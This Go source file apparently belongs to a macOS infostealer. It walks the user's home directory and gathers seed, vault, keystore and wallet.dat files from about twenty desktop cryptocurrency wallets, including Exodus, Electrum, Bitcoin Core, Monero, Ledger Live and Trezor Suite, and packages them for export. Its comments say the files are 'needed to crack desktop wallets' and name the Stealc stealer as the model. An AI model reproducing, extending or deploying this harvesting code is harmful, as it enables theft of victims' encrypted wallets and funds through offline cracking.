package scanner

import (
	"os"
	"path/filepath"
	"strings"
)

// DesktopWalletBundle groups crack-relevant files for one desktop wallet app.
type DesktopWalletBundle struct {
	WalletName string
	Entries    []WalletExtensionFileEntry
}

// CollectDesktopWalletBundles returns vault/database files needed to crack desktop wallets.
// Only high-value files are included (same approach as extension wallet export).
func CollectDesktopWalletBundles() []DesktopWalletBundle {
	home, _ := os.UserHomeDir()
	if home == "" {
		return nil
	}

	appSupport := filepath.Join(home, "Library", "Application Support")
	var bundles []DesktopWalletBundle

	add := func(name string, entries []WalletExtensionFileEntry) {
		if len(entries) > 0 {
			bundles = append(bundles, DesktopWalletBundle{
				WalletName: name,
				Entries:    entries,
			})
		}
	}

	// Exodus — seed.seco + storage.seco (Stealc, Purrglar, btcrecover)
	exodusRoot := filepath.Join(appSupport, "Exodus")
	exodusWallet := filepath.Join(exodusRoot, "exodus.wallet")
	var exodusEntries []WalletExtensionFileEntry
	exodusEntries = append(exodusEntries, collectNamedFiles(exodusWallet, []string{
		"seed.seco", "storage.seco", "passphrase.json", "unsafe-storage.json", "info.seco",
	}, "")...)
	exodusEntries = append(exodusEntries, collectWalletDataFiles(
		filepath.Join(exodusRoot, "Local Storage", "leveldb"), "local-storage")...)
	add("Exodus", exodusEntries)

	// Electrum — encrypted wallet files in ~/.electrum/wallets
	add("Electrum", collectWalletDirFiles(filepath.Join(home, ".electrum", "wallets"), ""))
	add("Electrum-LTC", collectWalletDirFiles(filepath.Join(home, ".electrum-ltc", "wallets"), ""))

	// Ethereum — keystore JSON (UTC--*)
	add("Ethereum", collectFilesByNamePrefix(
		filepath.Join(home, ".ethereum", "keystore"), "utc--", ""))

	// Atomic — LevelDB vault
	add("Atomic", collectWalletDataFiles(
		filepath.Join(appSupport, "atomic", "Local Storage", "leveldb"), ""))

	// Coinomi — wallet directory files
	add("Coinomi", collectWalletDirFiles(filepath.Join(appSupport, "Coinomi", "wallets"), ""))

	// Ledger Live — app config + local storage DB
	ledgerRoot := filepath.Join(appSupport, "Ledger Live")
	var ledgerEntries []WalletExtensionFileEntry
	ledgerEntries = append(ledgerEntries, collectNamedFiles(ledgerRoot, []string{
		"app.json", "settings.json", "accounts.json", "migrations.json",
	}, "")...)
	ledgerEntries = append(ledgerEntries, collectWalletDataFiles(
		filepath.Join(ledgerRoot, "Local Storage", "leveldb"), "local-storage")...)
	ledgerEntries = append(ledgerEntries, collectFilesWithExtensions(ledgerRoot, map[string]bool{
		".sqlite": true, ".json": true, ".ldb": true,
	}, "data", 4)...)
	add("Ledger-Live", ledgerEntries)

	// Trezor Suite — LevelDB + config
	trezorRoot := filepath.Join(appSupport, "@trezor", "suite-desktop")
	var trezorEntries []WalletExtensionFileEntry
	trezorEntries = append(trezorEntries, collectWalletDataFiles(
		filepath.Join(trezorRoot, "Local Storage", "leveldb"), "local-storage")...)
	trezorEntries = append(trezorEntries, collectFilesWithExtensions(trezorRoot, map[string]bool{
		".json": true,
	}, "config", 3)...)
	add("Trezor-Suite", trezorEntries)

	// Wasabi — .json wallet files
	add("Wasabi", collectFilesWithExtensions(
		filepath.Join(appSupport, "WalletWasabi", "Client", "Wallets"),
		map[string]bool{".json": true}, "", 2))

	// Daedalus — sqlite wallet DB
	add("Daedalus", collectFilesWithExtensions(
		filepath.Join(appSupport, "Daedalus Mainnet"),
		map[string]bool{".sqlite": true, ".sqlite-wal": true, ".sqlite-shm": true, ".key": true}, "", 4))

	// Sparrow — .wallet + db
	add("Sparrow", collectFilesWithExtensions(
		filepath.Join(appSupport, "Sparrow"),
		map[string]bool{".wallet": true, ".db": true, ".json": true}, "", 3))

	// Blockstream Green
	add("Blockstream-Green", collectFilesWithExtensions(
		filepath.Join(appSupport, "Blockstream Green"),
		map[string]bool{".sqlite": true, ".json": true, ".wallet": true}, "", 4))

	// Bitcoin / Litecoin / Dogecoin Core — wallet.dat
	add("Bitcoin-Core", collectNamedFilesRecursive(
		filepath.Join(appSupport, "Bitcoin"), []string{"wallet.dat"}, 5))
	add("Litecoin-Core", collectNamedFilesRecursive(
		filepath.Join(appSupport, "Litecoin"), []string{"wallet.dat"}, 5))
	add("Dogecoin-Core", collectNamedFilesRecursive(
		filepath.Join(appSupport, "Dogecoin"), []string{"wallet.dat"}, 5))

	// Guarda — leveldb + json
	guardaRoot := filepath.Join(appSupport, "Guarda")
	var guardaEntries []WalletExtensionFileEntry
	guardaEntries = append(guardaEntries, collectWalletDataFiles(
		filepath.Join(guardaRoot, "Local Storage", "leveldb"), "local-storage")...)
	guardaEntries = append(guardaEntries, collectFilesWithExtensions(guardaRoot, map[string]bool{
		".json": true,
	}, "config", 3)...)
	add("Guarda", guardaEntries)

	// Jaxx Liberty
	add("Jaxx-Liberty", collectFilesWithExtensions(
		filepath.Join(appSupport, "com.liberty.jaxx"),
		map[string]bool{".json": true, ".ldb": true}, "", 4))

	// Binance desktop
	binanceRoot := filepath.Join(appSupport, "Binance")
	var binanceEntries []WalletExtensionFileEntry
	binanceEntries = append(binanceEntries, collectWalletDataFiles(
		filepath.Join(binanceRoot, "Local Storage", "leveldb"), "local-storage")...)
	binanceEntries = append(binanceEntries, collectFilesWithExtensions(binanceRoot, map[string]bool{
		".json": true,
	}, "config", 3)...)
	add("Binance", binanceEntries)

	// Monero — .keys files
	add("Monero", collectFilesWithExtensions(
		filepath.Join(home, "Documents", "Monero", "wallets"),
		map[string]bool{".keys": true}, "", 2))

	// Feather — wallet files
	add("Feather", collectWalletDirFiles(filepath.Join(home, ".feather", "wallets"), ""))

	return bundles
}

func collectNamedFiles(dir string, names []string, zipPrefix string) []WalletExtensionFileEntry {
	var out []WalletExtensionFileEntry
	for _, name := range names {
		path := filepath.Join(dir, name)
		info, err := os.Stat(path)
		if err != nil || info.IsDir() || info.Size() == 0 || info.Size() > maxWalletExportFileSize {
			continue
		}
		zipPath := name
		if zipPrefix != "" {
			zipPath = zipPrefix + "/" + name
		}
		out = append(out, WalletExtensionFileEntry{SourcePath: path, ZipPath: zipPath})
	}
	return out
}

func collectNamedFilesRecursive(root string, names []string, maxDepth int) []WalletExtensionFileEntry {
	nameSet := make(map[string]bool, len(names))
	for _, n := range names {
		nameSet[strings.ToLower(n)] = true
	}
	var out []WalletExtensionFileEntry
	_ = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}
		rel, err := filepath.Rel(root, path)
		if err != nil {
			return nil
		}
		if strings.Count(rel, string(os.PathSeparator)) > maxDepth {
			return nil
		}
		if !nameSet[strings.ToLower(info.Name())] {
			return nil
		}
		if info.Size() == 0 || info.Size() > maxWalletExportFileSize {
			return nil
		}
		out = append(out, WalletExtensionFileEntry{
			SourcePath: path,
			ZipPath:    filepath.ToSlash(rel),
		})
		return nil
	})
	return out
}

func collectWalletDirFiles(dir, zipPrefix string) []WalletExtensionFileEntry {
	info, err := os.Stat(dir)
	if err != nil || !info.IsDir() {
		return nil
	}
	var out []WalletExtensionFileEntry
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil
	}
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		fi, err := e.Info()
		if err != nil || fi.Size() == 0 || fi.Size() > maxWalletExportFileSize {
			continue
		}
		name := e.Name()
		zipPath := name
		if zipPrefix != "" {
			zipPath = zipPrefix + "/" + name
		}
		out = append(out, WalletExtensionFileEntry{
			SourcePath: filepath.Join(dir, name),
			ZipPath:    zipPath,
		})
	}
	return out
}

func collectFilesByNamePrefix(dir, prefix, zipPrefix string) []WalletExtensionFileEntry {
	info, err := os.Stat(dir)
	if err != nil || !info.IsDir() {
		return nil
	}
	var out []WalletExtensionFileEntry
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil
	}
	prefixLower := strings.ToLower(prefix)
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		name := e.Name()
		if !strings.HasPrefix(strings.ToLower(name), prefixLower) {
			continue
		}
		fi, err := e.Info()
		if err != nil || fi.Size() == 0 || fi.Size() > maxWalletExportFileSize {
			continue
		}
		zipPath := name
		if zipPrefix != "" {
			zipPath = zipPrefix + "/" + name
		}
		out = append(out, WalletExtensionFileEntry{
			SourcePath: filepath.Join(dir, name),
			ZipPath:    zipPath,
		})
	}
	return out
}

func collectFilesWithExtensions(root string, exts map[string]bool, zipPrefix string, maxDepth int) []WalletExtensionFileEntry {
	info, err := os.Stat(root)
	if err != nil || !info.IsDir() {
		return nil
	}
	var out []WalletExtensionFileEntry
	_ = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}
		rel, err := filepath.Rel(root, path)
		if err != nil {
			return nil
		}
		if strings.Count(rel, string(os.PathSeparator)) > maxDepth {
			return filepath.SkipDir
		}
		ext := strings.ToLower(filepath.Ext(info.Name()))
		if !exts[ext] {
			return nil
		}
		if info.Size() == 0 || info.Size() > maxWalletExportFileSize {
			return nil
		}
		zipPath := filepath.ToSlash(rel)
		if zipPrefix != "" {
			zipPath = zipPrefix + "/" + zipPath
		}
		out = append(out, WalletExtensionFileEntry{SourcePath: path, ZipPath: zipPath})
		return nil
	})
	return out
}